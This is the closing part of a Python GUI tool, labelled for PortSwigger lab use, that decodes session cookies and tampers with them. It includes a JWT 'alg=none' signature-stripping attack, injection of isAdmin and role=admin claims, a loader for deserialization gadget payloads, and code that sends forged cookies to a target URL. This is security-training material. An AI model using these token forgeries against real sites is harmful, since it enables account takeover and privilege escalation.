                            f"Cookie tamperato generato!\n\nPreview:\n{new_val[:200]}")

    def do_test_request(self):
        """Invia una request di test al lab URL."""
        url = self.test_url_var.get().strip()
        cookie = self.gen_text.get("1.0", "end").strip()
        if not url:
            messagebox.showwarning("⚠ URL mancante", "Inserisci l'URL del lab PortSwigger.")
            return
        if not cookie:
            messagebox.showwarning("⚠ Cookie mancante", "Prima fai il Re-encode del cookie.")
            return

        def _do_request():
            log_event(f"🚀 Test request → {url}")
            try:
                req = urllib.request.Request(url, headers={"Cookie": cookie, "User-Agent": "CookieAnalyzer/2.0"})
                with urllib.request.urlopen(req, timeout=10) as resp:
                    status  = resp.status
                    headers = dict(resp.headers)
                    body    = resp.read(4096).decode("utf-8", errors="replace")
                result_txt = (
                    f"✅ Response: HTTP {status}\n"
                    f"Content-Type: {headers.get('Content-Type','?')}\n"
                    f"Set-Cookie: {headers.get('Set-Cookie','(none)')}\n\n"
                    f"Body (first 2000 chars):\n{body[:2000]}"
                )
                log_event(f"✅ Test OK: HTTP {status}")
            except urllib.error.HTTPError as e:
                result_txt = f"⚠ HTTP Error {e.code}: {e.reason}\n\nCookie usato:\n{cookie}"
                log_event(f"⚠ HTTP {e.code}: {e.reason}")
            except urllib.error.URLError as e:
                result_txt = f"❌ Connessione fallita: {e.reason}\n\nVerifica URL e connessione."
                log_event(f"❌ URLError: {e.reason}")
            except Exception as e:
                result_txt = f"❌ Errore: {e}"
                log_event(f"❌ Test crash: {e}")

            self.root.after(0, lambda: self.test_result.delete("1.0", "end"))
            self.root.after(0, lambda: self.test_result.insert("1.0", result_txt))
            self.root.after(0, self._refresh_log)

        threading.Thread(target=_do_request, daemon=True).start()

    # ── JWT HELPERS ───────────────────────────────────────────────────────────

    def _jwt_none_attack(self):
        raw = self.cookie_var.get().strip()
        if not raw or CURRENT_STATE.get("detected", {}).get("lang") != "JWT":
            messagebox.showwarning("⚠", "Carica prima un JWT valido (Detect & Decode).")
            return
        val = raw.split("=", 1)[1] if "=" in raw else raw
        parts = val.split(".")
        if len(parts) < 2:
            messagebox.showerror("❌", "JWT malformato")
            return
        # Modifica header: alg=none
        try:
            header = json.loads(safe_b64decode(parts[0]).decode())
            header["alg"] = "none"
            new_header = base64.urlsafe_b64encode(
                json.dumps(header, separators=(",",":")).encode()
            ).rstrip(b"=").decode()
            new_jwt = f"{new_header}.{parts[1]}."
            prefix = raw.split("=", 1)[0] + "=" if "=" in raw else ""
            self.gen_text.delete("1.0", "end")
            self.gen_text.insert("1.0", prefix + new_jwt)
            log_event("💣 JWT none attack payload generato")
            self.nb.select(2)
            messagebox.showinfo("✅ JWT none attack",
                                f"Header alg impostato a 'none'.\nSignature rimossa.\n\nCookie:\n{(prefix+new_jwt)[:150]}...")
        except Exception as e:
            messagebox.showerror("❌", f"Errore JWT none attack: {e}")

    def _jwt_isadmin(self):
        self._jwt_add_claim("isAdmin", True)

    def _jwt_role_admin(self):
        self._jwt_add_claim("role", "admin")

    def _jwt_add_claim(self, key, val):
        raw = self.cookie_var.get().strip()
        if not raw or CURRENT_STATE.get("detected", {}).get("lang") != "JWT":
            messagebox.showwarning("⚠", "Carica prima un JWT valido.")
            return
        # Aggiungi al param tree per poi fare reencode
        self._add_param_to_tree(key, str(val).lower() if isinstance(val, bool) else str(val))
        messagebox.showinfo("ℹ Info",
                            f"Parametro '{key}={val}' aggiunto.\nVai al tab Edit Params → Re-Encode.")
        self.nb.select(1)

    # ── PARAM TREE HELPERS ────────────────────────────────────────────────────

    def _populate_param_tree(self, params: list):
        for item in self.param_tree.get_children():
            self.param_tree.delete(item)
        for p in params:
            self.param_tree.insert("", "end", values=(p.get("key",""), str(p.get("value","")), "✏ Modifica"))

    def _get_params_from_tree(self) -> list:
        params = []
        for item in self.param_tree.get_children():
            vals = self.param_tree.item(item, "values")
            if vals and vals[0]:
                params.append({"key": vals[0], "value": vals[1] if len(vals) > 1 else ""})
        return params

    def _on_param_click(self, event):
        """Intercetta click sulla colonna azione (pennina)."""
        region = self.param_tree.identify_region(event.x, event.y)
        col    = self.param_tree.identify_column(event.x)
        if region == "cell" and col == "#3":  # colonna edit
            item = self.param_tree.identify_row(event.y)
            if item:
                self.param_tree.selection_set(item)
                self._on_param_double_click(event)

    def _cancel_edit(self):
        """Annulla modifica e resetta pannello."""
        self.edit_key_var.set("")
        self.edit_val_var.set("")
        self.edit_title.config(text="✏  Modifica Parametro")
        self.edit_type_badge.config(text="")
        self.edit_status.config(text="")
        self.param_tree.selection_remove(self.param_tree.selection())

    def _on_param_double_click(self, event):
        sel = self.param_tree.selection()
        if not sel:
            return
        vals = self.param_tree.item(sel[0], "values")
        key = vals[0] if vals else ""
        val = vals[1] if len(vals) > 1 else ""
        self.edit_key_var.set(key)
        self.edit_val_var.set(val)
        # Aggiorna titolo pannello
        lang = CURRENT_STATE.get("detected", {}).get("lang", "")
        self.edit_title.config(text=f"✏  Modifica: {key}")
        self.edit_type_badge.config(text=f" {lang} ")
        self.edit_status.config(text="")
        # Focus sul campo value per modifica immediata
        self.edit_val_entry.focus_set()
        self.edit_val_entry.select_range(0, "end")
        # Vai al tab Edit Params
        self.nb.select(1)

    def _update_param(self):
        sel = self.param_tree.selection()
        k = self.edit_key_var.get().strip()
        v = self.edit_val_var.get()
        if not k:
            messagebox.showwarning("⚠", "La chiave non può essere vuota.")
            return
        if sel:
            self.param_tree.item(sel[0], values=(k, v, "✏ Modifica"))
            log_event(f"✏ Param aggiornato: {k}={v}")
            self.edit_status.config(text=f"✅ Salvato: {k}={v[:30]}", fg="#3fb950")
            # Flash the row
            self.root.after(2000, lambda: self.edit_status.config(text=""))
        else:
            self.param_tree.insert("", "end", values=(k, v, "✏ Modifica"))
            log_event(f"+ Param aggiunto: {k}={v}")
            self.edit_status.config(text=f"✅ Aggiunto: {k}", fg="#3fb950")

    def _add_param_dialog(self):
        win = tk.Toplevel(self.root)
        win.title("Aggiungi Parametro")
        win.geometry("400x160")
        win.configure(bg=self._colors["bg"])
        win.grab_set()
        c = self._colors
        tk.Label(win, text="Key:", bg=c["bg"], fg=c["fg"], font=("Consolas",10)).pack(anchor="w", padx=16, pady=(12,2))
        key_var = tk.StringVar()
        tk.Entry(win, textvariable=key_var, bg=c["bg"], fg=c["fg"], insertbackground=c["fg"],
                 font=("Consolas",10), relief="flat", highlightbackground=c["border"],
                 highlightthickness=1).pack(fill="x", padx=16, ipady=4)
        tk.Label(win, text="Value:", bg=c["bg"], fg=c["fg"], font=("Consolas",10)).pack(anchor="w", padx=16, pady=(8,2))
        val_var = tk.StringVar()
        tk.Entry(win, textvariable=val_var, bg=c["bg"], fg=c["fg"], insertbackground=c["fg"],
                 font=("Consolas",10), relief="flat", highlightbackground=c["border"],
                 highlightthickness=1).pack(fill="x", padx=16, ipady=4)
        def _ok():
            k, v = key_var.get().strip(), val_var.get()
            if not k:
                messagebox.showwarning("⚠", "Key obbligatoria", parent=win)
                return
            self.param_tree.insert("", "end", values=(k, v, "✏ Modifica"))
            log_event(f"+ Param aggiunto: {k}={v}")
            win.destroy()
        ttk.Button(win, text="✅ Aggiungi", command=_ok).pack(pady=12)

    def _add_param_to_tree(self, key: str, val: str):
        self.param_tree.insert("", "end", values=(key, val, "✏ Modifica"))

    def _remove_param(self):
        sel = self.param_tree.selection()
        if not sel:
            messagebox.showwarning("⚠", "Seleziona prima un parametro da rimuovere (click su una riga).")
            return
        vals = self.param_tree.item(sel[0], "values")
        key = vals[0] if vals else "?"
        if messagebox.askyesno("🗑 Conferma", f"Rimuovere il parametro '{key}'?"):
            self.param_tree.delete(sel[0])
            log_event(f"🗑 Param rimosso: {key}")
            self._cancel_edit()

    # ── GADGET LOADER ─────────────────────────────────────────────────────────

    def _load_gadget_payload(self, payload: str):
        self.cookie_var.set(f"session={payload}")
        messagebox.showinfo("📥 Gadget Caricato",
                            f"Payload caricato nel campo cookie.\nClicca 'Detect & Decode' per analizzare.")
        log_event(f"📥 Gadget payload caricato: {payload[:40]}...")

    # ── PROXY ─────────────────────────────────────────────────────────────────

    def _forward_to_proxy(self):
        cookie = CURRENT_STATE.get("new_cookie") or self.cookie_var.get().strip()
        host   = self.proxy_host_var.get().strip() or "127.0.0.1"
        port   = self.proxy_port_var.get().strip() or "8080"
        if not cookie:
            messagebox.showwarning("⚠", "Nessun cookie da forwardare. Carica e analizza prima.")
            return
        msg = (
            f"📡 Forward Cookie a Proxy {host}:{port}\n\n"
            f"Cookie:\n{cookie}\n\n"
            f"ℹ Passaggi:\n"
            f"1. Apri Burp Suite → Proxy → Intercept ON\n"
            f"2. Fai una request dal browser attraverso {host}:{port}\n"
            f"3. Sostituisci manualmente il cookie nella request interceptata\n\n"
            f"Cookie copiato negli appunti!"
        )
        try:
            self.root.clipboard_clear()
            self.root.clipboard_append(cookie)
        except Exception:
            pass
        self.proxy_log.insert("end", f"\n[{datetime.datetime.now().strftime('%H:%M:%S')}] Forward → {host}:{port}\n{cookie}\n")
        self.proxy_log.see("end")
        log_event(f"📡 Cookie forwarded a {host}:{port}")
        messagebox.showinfo("📡 Forward", msg)

    # ── UTILS ─────────────────────────────────────────────────────────────────

    def _paste_cookie(self):
        try:
            text = self.root.clipboard_get()
            self.cookie_var.set(text.strip())
        except Exception:
            messagebox.showwarning("⚠", "Impossibile incollare dagli appunti.")

    def _clear_all(self):
        self.cookie_var.set("")
        self.lang_label.config(text="—")
        self.conf_label.config(text="")
        self.detect_label.config(text="")
        self.decode_text.delete("1.0", "end")
        self.gen_text.delete("1.0", "end")
        self.test_result.delete("1.0", "end")
        for item in self.param_tree.get_children():
            self.param_tree.delete(item)
        CURRENT_STATE.update({"raw_cookie":"","detected_lang":"Unknown","decoded_data":{},"params":[],"new_cookie":""})
        log_event("🗑 UI e stato resettati")

    def _copy_generated(self):
        val = self.gen_text.get("1.0", "end").strip()
        if not val:
            messagebox.showwarning("⚠", "Nessun cookie da copiare.")
            return
        self.root.clipboard_clear()
        self.root.clipboard_append(val)
        messagebox.showinfo("✅ Copiato", "Cookie tamperato copiato negli appunti!")

    def _export_cookie(self):
        val = self.gen_text.get("1.0", "end").strip()
        if not val:
            messagebox.showwarning("⚠", "Nessun cookie da esportare.")
            return
        path = filedialog.asksaveasfilename(
            defaultextension=".txt",
            filetypes=[("Text files","*.txt"),("All","*.*")],
            title="Salva Cookie Tamperato"
        )
        if path:
            try:
                with open(path, "w") as fh:
                    fh.write(val)
                messagebox.showinfo("✅ Salvato", f"Cookie salvato in:\n{path}")
                log_event(f"💾 Cookie esportato: {path}")
            except Exception as e:
                messagebox.showerror("❌ Errore", f"Impossibile salvare: {e}")

    def _save_preview(self):
        val = self.decode_text.get("1.0", "end").strip()
        if not val:
            messagebox.showwarning("⚠", "Nessun preview da salvare.")
            return
        path = filedialog.asksaveasfilename(
            defaultextension=".txt",
            filetypes=[("Text files","*.txt"),("All","*.*")],
            title="Salva Preview Decode"
        )
        if path:
            try:
                with open(path, "w") as fh:
                    fh.write(val)
                messagebox.showinfo("✅ Salvato", f"Preview salvato in:\n{path}")
            except Exception as e:
                messagebox.showerror("❌ Errore", f"Impossibile salvare: {e}")

    def _refresh_log(self):
        self.log_text.delete("1.0", "end")
        for entry in CURRENT_STATE["log"][-300:]:
            self.log_text.insert("end", entry + "\n")
        self.log_text.see("end")

    def _clear_log(self):
        LOG_BUFFER.clear()
        CURRENT_STATE["log"] = []
        self._refresh_log()

    def _save_log(self):
        path = filedialog.asksaveasfilename(
            defaultextension=".log",
            filetypes=[("Log files","*.log"),("Text","*.txt"),("All","*.*")],
            title="Salva Log"
        )
        if path:
            try:
                with open(path, "w") as fh:
                    fh.write("\n".join(CURRENT_STATE["log"]))
                messagebox.showinfo("✅ Salvato", f"Log salvato in:\n{path}")
            except Exception as e:
                messagebox.showerror("❌ Errore", f"Impossibile salvare log: {e}")

    def _start_log_refresh(self):
        """Auto-refresh log ogni 2 secondi."""
        def _tick():
            try:
                self._refresh_log()
            except Exception:
                pass
            self.root.after(2000, _tick)
        self.root.after(2000, _tick)


# ─── MAIN ─────────────────────────────────────────────────────────────────────

def main():
    log_event(f"═══ {APP_TITLE} ═══")
    log_event(f"Python {sys.version.split()[0]} | PID {os.getpid()}")

    # Avvia web server in thread daemon
    web_thread = threading.Thread(target=start_web_server, daemon=True, name="WebServer")
    web_thread.start()
    log_event(f"🌐 Web UI: http://{PROXY_HOST}:{WEB_PORT}")

    # Avvia GUI tkinter nel main thread
    root = tk.Tk()
    root.resizable(True, True)

    try:
        # Icona inline (fallback graceful se non disponibile)
        icon_data = """
R0lGODlhEAAQAMQAAAAAAP///wAAAP8AAAD/AP//AAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEAAAAALAAAAAAQABAA
AAVVICSOZGmeaKqubOu+cCzPdG3feK7vfO//wKBwSCwaj8ikcslsOp/
QqHRKrVqv2Kx2y+16v+CweEwum8/otHrNbrvf8Lh8Tq/b7/i8fs/v+/9/
AAkIBSEAOw==
"""
        try:
            import base64 as _b64, io
            from PIL import Image, ImageTk
        except Exception:
            pass  # No PIL, skip icon
    except Exception:
        pass

    app = CookieAnalyzerGUI(root)

    def _on_close():
        if messagebox.askokcancel("Uscire?", "Chiudere PortSwigger Cookie Analyzer?"):
            log_event("👋 App chiusa dall'utente")
            root.destroy()
            sys.exit(0)

    root.protocol("WM_DELETE_WINDOW", _on_close)

    # Mostra info avvio
    root.after(600, lambda: messagebox.showinfo(
        "✅ App Avviata",
        f"{APP_TITLE}\n\n"
        f"🖥 GUI: questa finestra\n"
        f"🌐 Web UI: http://{PROXY_HOST}:{WEB_PORT}\n\n"
        f"Incolla il tuo cookie di sessione nel campo in alto\ne clicca 'Detect & Decode'!\n\n"
        f"⚠ Solo per uso educativo in ambienti lab PortSwigger."
    ))

    root.mainloop()


if __name__ == "__main__":
    main()
